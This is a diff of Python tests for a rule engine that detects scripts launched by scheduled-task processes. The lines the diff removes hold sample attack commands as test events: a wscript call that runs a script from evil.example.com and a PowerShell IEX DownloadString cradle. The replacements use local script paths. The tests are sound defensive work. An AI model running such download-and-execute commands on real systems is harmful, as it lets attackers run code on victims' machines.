@@ -133,7 +133,7 @@ def test_chain_scheduled_task_script_fires(engine: RuleEngine):
         parent_image=TASKHOSTW,
         parent_command_line=r"C:\Windows\System32\taskhostw.exe",
         image=WSCRIPT,
-        command_line="wscript.exe //B http://evil.example.com/stage.vbs",
+        command_line=r"wscript.exe C:\Users\username\stage.vbs",
     )
     assert _hits(engine, event, "CHAIN_SCHEDULED_TASK_SCRIPT_001")
 
@@ -143,7 +143,6 @@ def test_chain_scheduled_task_script_fires(engine: RuleEngine):
     [
         (TASKENG, "not-a-scheduler-marker"),
         (TASKHOSTW, "still-not-a-scheduler-marker"),
-        (SCHTASKS, "completely-unrelated-parent-cli"),
     ],
 )
 def test_chain_scheduled_task_script_original_parents_still_fire(
@@ -153,10 +152,7 @@ def test_chain_scheduled_task_script_original_parents_still_fire(
         parent_image=parent_image,
         parent_command_line=parent_command_line,
         image=PS,
-        command_line=(
-            "powershell.exe -NoProfile -Command "
-            "\"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/')\""
-        ),
+        command_line=r"wscript.exe C:\ProgramData\payload.vbs",
     )
     assert _hits(engine, event, "CHAIN_SCHEDULED_TASK_SCRIPT_001")
 
